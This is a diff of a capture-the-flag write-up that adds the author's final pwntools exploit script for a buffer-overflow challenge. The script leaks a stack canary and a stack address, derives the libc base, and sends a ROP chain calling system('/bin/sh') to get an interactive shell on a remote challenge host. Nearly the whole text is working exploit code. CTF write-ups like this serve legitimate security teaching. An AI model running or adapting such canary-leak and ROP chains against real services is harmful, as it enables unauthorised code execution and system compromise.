@@ -177,4 +177,92 @@ payload += p64(system)
 L3AK{m30w_m30w_1n_th3_d4rk_y0u_c4n_r0p_l1k3_th4t_c4t}
 
 # 5.0 FINAL SCRIPT 
-![[exploit3.py]]
+```python
+# -*- coding: utf-8 -*-
+from pwn import*
+context.log_level='debug'
+context.arch='amd64'
+context.os = "linux"
+
+pc = "./chall_patched"
+
+libc  = ELF('./libc.so.6', checksec=False)
+ld = ELF("ld-2.39.so")
+exe = context.binary = ELF(pc)
+
+
+
+scripts = """
+"""
+ 
+if __name__ == '__main__':
+    local = sys.argv[1]
+    if local == 'l':
+        r= process(pc)
+        elf = ELF(pc)
+    else:
+        r=remote("34.45.81.67",16006)
+        elf = ELF(pc)
+ 
+s = lambda *a, **k: r.send(*a, **k)
+sa = lambda s,n : r.sendafter(s,n)
+sla = lambda s,n : r.sendlineafter(s,n)
+sl = lambda s : r.sendline(s)
+sd = lambda s : r.send(s)
+rc = lambda n : r.recv(n)
+rl = lambda: r.recvline()
+ru = lambda s : r.recvuntil(s)
+ti = lambda: r.interactive()
+lg = lambda s: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
+bhex = lambda b: int(b.decode(), 16)
+ru7f = lambda: r.recvuntil(b'\x7f')
+dbg = lambda: gdb.attach(r)
+dbgstart = lambda script=scripts: gdb.attach(r, gdbscript=script)
+
+payload = "CHUNK 100 1 "
+canary_offset = 0x49
+payload += "a"*canary_offset
+
+sl(b"CHUNKS 3")
+s(payload)
+ru(b"a" * canary_offset)
+
+
+# leak 0x7f8c061fff70
+# base 0x7f8c06400000
+
+# leak
+# must + b'\0'
+leak=b'\x00'+rl().strip()
+warn(f"Thread leak: {leak}")
+canary = u64(leak[:8])
+print("canary:",hex(canary))
+leak_stack = u64(leak[8:]+b'\x00'*(8-len(leak[8:])))
+print("leak_stack",hex(leak_stack))
+libc_base = leak_stack + 0x200090
+print("libc base",hex(libc_base))
+libc.address=libc_base
+# dbg()
+
+# ROP
+rop = ROP(libc)
+ret = rop.find_gadget(['ret'])[0]
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+bin_sh = next(libc.search(b'/bin/sh'))
+system = libc.sym['system']
+
+# attack payload 
+offset = 0x48
+payload = b'CHUNK 1 1 ' 
+payload += b'a' * offset 
+payload += p64(canary)
+payload += b'b' * 8
+payload += p64(ret)
+payload += p64(pop_rdi)
+payload += p64(bin_sh)
+payload += p64(system)
+
+s(payload)
+
+ti()
+```
